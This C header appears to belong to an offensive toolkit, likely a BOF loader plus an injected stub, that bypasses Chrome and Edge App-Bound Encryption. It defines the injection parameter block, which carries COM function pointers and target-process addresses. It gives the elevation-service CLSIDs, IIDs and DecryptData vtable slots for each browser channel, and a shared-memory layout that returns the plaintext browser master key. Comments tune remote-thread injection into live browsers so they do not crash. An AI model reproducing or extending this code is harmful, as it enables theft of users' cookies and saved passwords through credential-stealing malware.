// abe_common.h: shared definitions between the PIC stub and the BOF/assembly loader.
//
// Layout contract (x64, MSVC default packing, 8-byte):
//   offset  size  field
//   0x00    16    clsid          CoCreateInstance class (elevator per browser)
//   0x10    16    iid            requested interface
//   0x20     4    slot           DecryptData vtable slot (5 = IElevator/IElevator2,
//                                 8 = Edge final flavor w/ placeholder prefix)
//   0x24     4    blob_len       app-bound key material length
//   0x28     8    pCoInitializeEx
//   0x30     8    pCoCreateInstance
//   0x38     8    pSysAllocStringByteLen
//   0x40     8    pSysStringByteLen
//   0x48     8    pSysFreeString
//   0x50     8    pSleep
//   0x58     8    pCoSetProxyBlanket
//   0x60     8    blob           target-process address of app-bound material
//                                 (post-APPB, straight to DecryptData; the
//                                 service's SYSTEM-DPAPI layer is inside the
//                                 service; there is NO user-DPAPI wrapper in
//                                 the M157 os_crypt_async storage format)
//   0x68     8    out            target-process address of shared section view:
//                                 [0x00] u32 done   0=pending 1=ok 2=err
//                                 [0x04] u32 hr     DecryptData HRESULT (err case)
//                                 [0x08] 32 bytes   plaintext master key (ok case)
//   0x70     8    candidates     target address of CANDIDATE array (see below),
//                                 0 = single-shot using clsid/iid/slot above
//   0x78     4    ncand
//   0x7c     4    pad            (struct total 0x80)
//
// Candidate chain (CANDIDATE, 40 bytes each):
//   0x00 16  clsid
//   0x10 16  iid
//   0x20  4  slot
//   0x24  4  pad
//
// The stub walks candidates in order; first DecryptData success wins. This
// absorbs interface-shape drift between Chromium base IIDs (standard layout,
// slot 5) and Edge final flavor IIDs (3-method placeholder prefix, slot 8).

#ifndef ABE_COMMON_H
#define ABE_COMMON_H

#ifdef _MSC_VER
#pragma pack(push, 8)
#endif

typedef unsigned int       abe_u32;
typedef unsigned __int64   abe_u64;

typedef struct _ABE_GUID {
    abe_u32 data1;
    unsigned short data2;
    unsigned short data3;
    unsigned char data4[8];
} ABE_GUID;

typedef struct _ABE_CANDIDATE {
    ABE_GUID clsid;
    ABE_GUID iid;
    abe_u32 slot;
    abe_u32 flags;   /* was pad: bit 0 = ABE_CAND_APT_MTA (force MTA apartment) */
} ABE_CANDIDATE;

typedef struct _ABE_PARAMS {
    ABE_GUID clsid;                 /* 0x00 legacy single-candidate fields  */
    ABE_GUID iid;                   /* 0x10 (kept for minimal layouts)     */
    abe_u32 slot;                   /* 0x20                                */
    abe_u32 blob_len;               /* 0x24                                */
    abe_u64 pCoInitializeEx;        /* 0x28                                */
    abe_u64 pCoCreateInstance;      /* 0x30                                */
    abe_u64 pSysAllocStringByteLen; /* 0x38                                */
    abe_u64 pSysStringByteLen;      /* 0x40                                */
    abe_u64 pSysFreeString;         /* 0x48                                */
    abe_u64 pSleep;                 /* 0x50                                */
    abe_u64 pCoSetProxyBlanket;     /* 0x58                                */
    abe_u64 blob;                   /* 0x60                                */
    abe_u64 out;                    /* 0x68                                */
    abe_u64 candidates;             /* 0x70                                */
    abe_u32 ncand;                  /* 0x78                                */
    abe_u32 pad;                    /* 0x7c  struct total 0x80            */
} ABE_PARAMS;

/* Section view offsets */
#define ABE_SEC_DONE   0
#define ABE_SEC_HR     4
#define ABE_SEC_KEY    8
#define ABE_SEC_BC     40  /* breadcrumb: last completed stub step (survives
                              target crash; the section is shared)         */
#define ABE_SEC_CANDIDX 44 /* diagnostics: index of the candidate the stub is
                              currently trying (survives target crash)     */
#define ABE_SEC_LASTHR  48 /* diagnostics: hr returned by the last attempted
                              candidate (survives target crash)            */
#define ABE_SEC_SIZE   64

/* Status values at ABE_SEC_DONE */
#define ABE_DONE_PENDING 0
#define ABE_DONE_OK      1
#define ABE_DONE_ERR     2

/* DecryptData vtable slots */
#define ABE_SLOT_STD    5   /* IElevator and IElevator2 (Chromium layout)   */
#define ABE_SLOT_EDGE   8   /* Edge final flavor: 3-method placeholder first */

/* Candidate flags (ABE_CANDIDATE.flags)
 *   bit 0 ABE_CAND_APT_MTA: CoInitializeEx the injected thread MTA (0) even
 *   for an Edge candidate. Default apartment: Chrome MTA, Edge STA (matches
 *   Edge's own hosting on 157). Edge 158.0.4370.33 access-violates inside
 *   CoInitializeEx(STA) on a fresh remote thread in the live main browser
 *   and crashes it, so the Edge chain leads with MTA candidates and keeps
 *   STA as a fallback. */
#define ABE_CAND_APT_MTA 1u

/* HRESULT codes carried in the section for operator-visible diagnosis */
/* (values reused from the elevation service where meaningful) */

#ifdef _MSC_VER
#pragma pack(pop)
#endif

/* Browser constant sets. Chrome modes from google_chrome_install_modes.h
 * (M157). Edge CLSID from the registered elevation service; IIDs from the
 * Edge COM typelib. Try IElevator2 first, IElevator v1 as fallback. */

/* CLSIDs */
#define ABE_CLSID_CHROME_STABLE 0x708860E0,0xF641,0x4611,{0x88,0x95,0x7D,0x86,0x7D,0xD3,0x67,0x5B}
#define ABE_CLSID_CHROME_BETA   0xDD2646BA,0x3707,0x4BF8,{0xB9,0xA7,0x03,0x86,0x91,0xA6,0x8F,0xC2}
#define ABE_CLSID_CHROME_DEV    0xDA7FDCA5,0x2CAA,0x4637,{0xAA,0x17,0x07,0x40,0x58,0x4D,0xE7,0xDA}
#define ABE_CLSID_CHROME_CANARY 0x704C2872,0x2049,0x435E,{0xA4,0x69,0x0A,0x53,0x43,0x13,0xC4,0x2B}
#define ABE_CLSID_EDGE          0x1FCBE96C,0x1697,0x43AF,{0x91,0x40,0x28,0x97,0xC7,0xC6,0x97,0x67}

/* IIDs: Chromium base (standard layout) */
#define ABE_IID_IELEVATOR2      0x8F7B6792,0x784D,0x4047,{0x84,0x5D,0x17,0x82,0xEF,0xBE,0xF2,0x05}
#define ABE_IID_IELEVATOR       0xA949CB4E,0xC4F9,0x44C4,{0xB2,0x13,0x6B,0xF8,0xAA,0x9A,0xC6,0x9C}
#define ABE_IID_IELEVATOR2_CHROME 0x1BF5208B,0x295F,0x4992,{0xB5,0xF4,0x3A,0x9B,0xB6,0x49,0x48,0x38}
#define ABE_IID_IELEVATOR_CHROME  0x463ABECF,0x410D,0x407F,{0x8A,0xF5,0x0D,0xF3,0x5A,0x00,0x5C,0xC8}

/* IIDs: Edge flavors (placeholder-prefixed layout, slot 8) */
#define ABE_IID_EDGE3_STABLE    0x12B23868,0x6DCD,0x4D1A,{0xAD,0x4C,0x65,0xB0,0x28,0x52,0x01,0xFC}
#define ABE_IID_EDGE_FINAL2     0x8F7B6792,0x784D,0x4047,{0x84,0x5D,0x17,0x82,0xEF,0xBE,0xF2,0x05}
#define ABE_IID_EDGE_FINAL      0xC9C2B807,0x7731,0x4F34,{0x81,0xB7,0x44,0xFF,0x77,0x79,0x52,0x2B}
#define ABE_IID_EDGE_COPILOT    0x17DF149F,0xBE61,0x447E,{0xA3,0x05,0x52,0x2F,0x55,0x02,0x1B,0x36}

#endif /* ABE_COMMON_H */
